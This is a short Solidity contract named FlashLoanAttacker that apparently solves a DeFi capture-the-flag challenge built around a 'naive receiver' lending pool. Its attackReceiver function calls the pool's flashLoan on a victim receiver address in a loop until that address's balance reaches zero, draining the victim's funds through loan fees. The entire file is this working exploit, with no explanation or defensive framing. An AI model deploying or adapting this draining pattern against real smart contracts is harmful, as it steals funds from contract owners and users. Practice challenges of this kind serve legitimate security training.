pragma solidity ^0.8.0;

import './NaiveReceiverLenderPool.sol';

contract FlashLoanAttacker{
    NaiveReceiverLenderPool pool;
    address drainAddress;

    constructor(address _poolAddress, address _drainAddress) {
        pool = NaiveReceiverLenderPool(payable(_poolAddress));
        drainAddress = _drainAddress;
    }

    function attackReceiver() public {
        while(address(drainAddress).balance > 0){
           pool.flashLoan(drainAddress, 1); 
        }
    }
}